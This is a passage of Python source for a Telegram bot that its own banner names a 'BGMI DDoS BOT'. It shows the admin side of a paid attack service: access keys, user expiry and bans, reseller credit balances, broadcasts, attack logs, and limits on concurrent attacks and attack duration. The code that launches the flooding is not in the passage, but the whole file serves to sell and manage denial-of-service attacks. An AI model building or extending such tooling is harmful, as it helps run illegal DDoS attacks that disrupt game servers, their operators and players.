        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/inallkey AMOUNT", parse_mode="Markdown")
        return
    
    count = increase_all_keys(int(args[1]))
    bot.reply_to(message, f"✅ {count} keys +{args[1]}", parse_mode="Markdown")

@bot.message_handler(commands=['allremoveinkey'])
def allremoveinkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/allremoveinkey AMOUNT", parse_mode="Markdown")
        return
    
    count = decrease_all_keys(int(args[1]))
    bot.reply_to(message, f"✅ {count} keys -{args[1]}", parse_mode="Markdown")

# ═══════════════════════════════════════════════════
# 📌 USER MANAGEMENT COMMANDS
# ═══════════════════════════════════════════════════
@bot.message_handler(commands=['users'])
def users_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    users = load_json(USER_FILE, {})
    if not users:
        bot.reply_to(message, "📦 No users", parse_mode="Markdown")
        return
    
    msg = "👥 USERS:\n\n"
    for uid, info in list(users.items())[:30]:
        if info.get("banned"):
            status = "🚫 BANNED"
        else:
            try:
                expiry = datetime.datetime.fromisoformat(info["expiry"])
                if datetime.datetime.now() > expiry:
                    status = "⏰ EXPIRED"
                else:
                    remaining = expiry - datetime.datetime.now()
                    days = remaining.days
                    hours = remaining.seconds // 3600
                    status = f"✅ {days}d {hours}h left"
            except:
                status = "⚠️ Error"
        
        msg += f"🆔 `{uid}` | {status}\n"
    
    msg += f"\n📊 Total: {len(users)}"
    bot.reply_to(message, msg[:4000], parse_mode="Markdown")

@bot.message_handler(commands=['removeuser'])
def removeuser_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/removeuser USER\\_ID", parse_mode="Markdown")
        return
    
    if remove_user_key(args[1]):
        bot.reply_to(message, f"✅ User `{args[1]}` removed", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ User not found", parse_mode="Markdown")

@bot.message_handler(commands=['removeuserkey'])
def removeuserkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/removeuserkey USER\\_ID", parse_mode="Markdown")
        return
    
    if remove_user_key(args[1]):
        bot.reply_to(message, f"✅ User `{args[1]}` key removed", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ User not found", parse_mode="Markdown")

@bot.message_handler(commands=['extenduser'])
def extenduser_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/extenduser USER\\_ID DAYS", parse_mode="Markdown")
        return
    
    target_user = args[1]
    try:
        extra_days = int(args[2])
    except:
        bot.reply_to(message, "❌ Invalid days", parse_mode="Markdown")
        return
    
    users = load_json(USER_FILE, {})
    if target_user not in users:
        bot.reply_to(message, "❌ User not found", parse_mode="Markdown")
        return
    
    current_expiry = datetime.datetime.fromisoformat(users[target_user]["expiry"])
    new_expiry = current_expiry + datetime.timedelta(days=extra_days)
    users[target_user]["expiry"] = new_expiry.isoformat()
    save_json(USER_FILE, users)
    
    key = users[target_user].get("key")
    if key:
        keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
        if key in keys_data.get("used", {}):
            keys_data["used"][key]["expiry"] = new_expiry.isoformat()
            save_json(KEYS_FILE, keys_data)
    
    try:
        bot.send_message(target_user, f"✅ +{extra_days} days", parse_mode="Markdown")
    except:
        pass
    
    bot.reply_to(message, f"✅ User `{target_user}` +{extra_days} days", parse_mode="Markdown")

@bot.message_handler(commands=['extendusers'])
def extendusers_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message,
            "╔══════════════════════════════╗\n"
            "║    ❌ INVALID USAGE         ║\n"
            "╚══════════════════════════════╝\n\n"
            "/extendusers DURATION UNIT\n"
            "Example: /extendusers 7 day\n"
            "Units: min, hour, day",
            parse_mode="Markdown")
        return
    
    dur = int(args[1])
    unit = args[2].lower()
    
    if unit not in ["min", "hour", "day"]:
        bot.reply_to(message, "❌ Unit: min, hour, day", parse_mode="Markdown")
        return
    
    count = extend_all_users(dur, unit)
    bot.reply_to(message,
        f"╔══════════════════════════════╗\n"
        f"║  ✅ ALL USERS EXTENDED     ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"👥 {count} users extended\n"
        f"⏱️ +{dur} {unit}",
        parse_mode="Markdown")

@bot.message_handler(commands=['ban'])
def ban_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/ban USER\\_ID \\[reason\\]", parse_mode="Markdown")
        return
    
    target = args[1]
    reason = " ".join(args[2:]) if len(args) > 2 else "No reason"
    
    banned = load_json(BANNED_FILE, {})
    banned[target] = {
        "banned_at": datetime.datetime.now().isoformat(),
        "reason": reason,
        "banned_by": str(message.from_user.id)
    }
    save_json(BANNED_FILE, banned)
    
    users = load_json(USER_FILE, {})
    if target in users:
        users[target]["banned"] = True
        save_json(USER_FILE, users)
    
    bot.reply_to(message, f"✅ `{target}` banned\nReason: {reason}", parse_mode="Markdown")

@bot.message_handler(commands=['unban'])
def unban_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/unban USER\\_ID", parse_mode="Markdown")
        return
    
    banned = load_json(BANNED_FILE, {})
    if args[1] in banned:
        del banned[args[1]]
        save_json(BANNED_FILE, banned)
        
        users = load_json(USER_FILE, {})
        if args[1] in users:
            users[args[1]]["banned"] = False
            save_json(USER_FILE, users)
        
        bot.reply_to(message, f"✅ `{args[1]}` unbanned", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Not banned", parse_mode="Markdown")

@bot.message_handler(commands=['bannedlist'])
def bannedlist_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    banned = load_json(BANNED_FILE, {})
    if not banned:
        bot.reply_to(message, "📦 No banned users", parse_mode="Markdown")
        return
    
    msg = "🚫 BANNED USERS:\n\n"
    for uid, info in banned.items():
        msg += f"🆔 `{uid}` | {info.get('reason', 'N/A')}\n"
    
    bot.reply_to(message, msg[:4000], parse_mode="Markdown")

# ═══════════════════════════════════════════════════
# 📌 RESELLER MANAGEMENT
# ═══════════════════════════════════════════════════
@bot.message_handler(commands=['addreseller'])
def addreseller_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/addreseller USER\\_ID", parse_mode="Markdown")
        return
    
    add_reseller(args[1])
    bot.reply_to(message, f"✅ Reseller added: `{args[1]}`", parse_mode="Markdown")

@bot.message_handler(commands=['removereseller'])
def removereseller_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/removereseller USER\\_ID", parse_mode="Markdown")
        return
    
    if remove_reseller(args[1]):
        bot.reply_to(message, f"✅ Reseller removed: `{args[1]}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Not a reseller", parse_mode="Markdown")

@bot.message_handler(commands=['remove_reseller_balance'])
def remove_reseller_balance_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/remove\\_reseller\\_balance USER\\_ID", parse_mode="Markdown")
        return
    
    if str(args[1]) == OWNER_ID or is_co_owner(args[1]):
        bot.reply_to(message, "❌ Cannot remove owner/co-owner balance", parse_mode="Markdown")
        return
    
    balances = load_json(BALANCE_FILE, {})
    if args[1] in balances:
        balances[args[1]] = 0
        save_json(BALANCE_FILE, balances)
        bot.reply_to(message, f"✅ Balance reset for `{args[1]}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ User not found", parse_mode="Markdown")

@bot.message_handler(commands=['addbalance'])
def addbalance_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/addbalance USER\\_ID AMOUNT", parse_mode="Markdown")
        return
    
    try:
        amount = int(args[2])
    except:
        bot.reply_to(message, "❌ Invalid amount", parse_mode="Markdown")
        return
    
    new_balance = add_balance(args[1], amount)
    bot.reply_to(message, f"✅ +{amount} credits to `{args[1]}`\n💰 Balance: {new_balance}", parse_mode="Markdown")

@bot.message_handler(commands=['resellers'])
def resellers_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    resellers = load_json(RESELLER_FILE, {})
    if not resellers:
        bot.reply_to(message, "📦 No resellers", parse_mode="Markdown")
        return
    
    msg = "👥 RESELLERS:\n\n"
    for uid in resellers:
        msg += f"🆔 `{uid}` | 💰 {get_balance(uid)} credits\n"
    
    bot.reply_to(message, msg[:4000], parse_mode="Markdown")

# ═══════════════════════════════════════════════════
# 📌 SYSTEM COMMANDS
# ═══════════════════════════════════════════════════
@bot.message_handler(commands=['setlimit'])
def setlimit_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    global MAX_CONCURRENT_ATTACKS, MAX_ATTACK_DURATION, COOLDOWN_SECONDS
    
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message,
            "╔══════════════════════════════╗\n"
            "║    ❌ INVALID USAGE         ║\n"
            "╚══════════════════════════════╝\n\n"
            "/setlimit MAX\\_CONCURRENT MAX\\_DURATION COOLDOWN\n"
            f"Current: {MAX_CONCURRENT_ATTACKS} | {MAX_ATTACK_DURATION}s | {COOLDOWN_SECONDS}s",
            parse_mode="Markdown")
        return
    
    try:
        MAX_CONCURRENT_ATTACKS = int(args[1])
        MAX_ATTACK_DURATION = int(args[2])
        COOLDOWN_SECONDS = int(args[3])
        
        bot.reply_to(message,
            f"╔══════════════════════════════╗\n"
            f"║  ✅ LIMITS UPDATED         ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"⚔️ Max Concurrent: {MAX_CONCURRENT_ATTACKS}\n"
            f"⏱️ Max Duration: {MAX_ATTACK_DURATION}s\n"
            f"🕐 Cooldown: {COOLDOWN_SECONDS}s",
            parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ Invalid values", parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    text = message.text.replace('/broadcast', '', 1).strip()
    if not text:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/broadcast MESSAGE", parse_mode="Markdown")
        return
    
    users = load_json(USER_FILE, {})
    success, fail = 0, 0
    for uid in users:
        try:
            bot.send_message(uid, f"╔═════════════════════╗\n║📢 *Announcement!* 📢\n╚═════════════════════╝\n\n{text}", parse_mode="Markdown")
            success += 1
        except:
            fail += 1
    
    bot.reply_to(message, f"✅ Sent: {success} | ❌ Failed: {fail}", parse_mode="Markdown")

@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    users = load_json(USER_FILE, {})
    resellers = load_json(RESELLER_FILE, {})
    banned = load_json(BANNED_FILE, {})
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    active_users = sum(1 for uid, info in users.items() 
                       if not info.get("banned") 
                       and datetime.datetime.now() <= datetime.datetime.fromisoformat(info["expiry"]))
    
    stats_msg = (
        f"╔══════════════════════════════╗\n"
        f"║     📊 STATISTICS          ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"👥 Active Users: {active_users}\n"
        f"💰 Resellers: {len(resellers)}\n"
        f"🚫 Banned: {len(banned)}\n"
        f"🔑 Unused Keys: {len(keys_data['unused'])}\n"
        f"🔴 Active Keys: {len(keys_data['used'])}\n"
        f"⚔️ Active Attacks: {len(active_attacks)}/{MAX_CONCURRENT_ATTACKS}\n\n"
        f"⚙️ Limits:\n"
        f"Max Concurrent: {MAX_CONCURRENT_ATTACKS}\n"
        f"Max Duration: {MAX_ATTACK_DURATION}s\n"
        f"Cooldown: {COOLDOWN_SECONDS}s"
    )
    
    bot.reply_to(message, stats_msg, parse_mode="Markdown")

@bot.message_handler(commands=['systeminfo'])
def systeminfo_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    bot.reply_to(message, f"```\n{get_system_info()}\n```", parse_mode="Markdown")

@bot.message_handler(commands=['logs'])
def logs_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
        with open(LOG_FILE, "rb") as f:
            bot.send_document(message.chat.id, f, caption="📋 Attack Logs")
    else:
        bot.reply_to(message, "📦 No logs", parse_mode="Markdown")

@bot.message_handler(commands=['clearlogs'])
def clearlogs_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    with open(LOG_FILE, "w") as f:
        f.write("")
    bot.reply_to(message, "✅ Logs cleared", parse_mode="Markdown")

# ═══════════════════════════════════════════════════
# 🚀 START BOT
# ═══════════════════════════════════════════════════
if __name__ == "__main__":
    print("=" * 50)
    print("🔥 BGMI DDoS BOT - COMPLETE")
    print("=" * 50)
    print(f"👑 Owner: {OWNER_ID}")
    print(f"🎮 Method: {DISPLAY_METHOD}")
    print(f"⚔️ Max Concurrent: {MAX_CONCURRENT_ATTACKS}")
    print(f"⏱️ Max Duration: {MAX_ATTACK_DURATION}s")
    print(f"🕐 Cooldown: {COOLDOWN_SECONDS}s")
    print("=" * 50)
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(5)
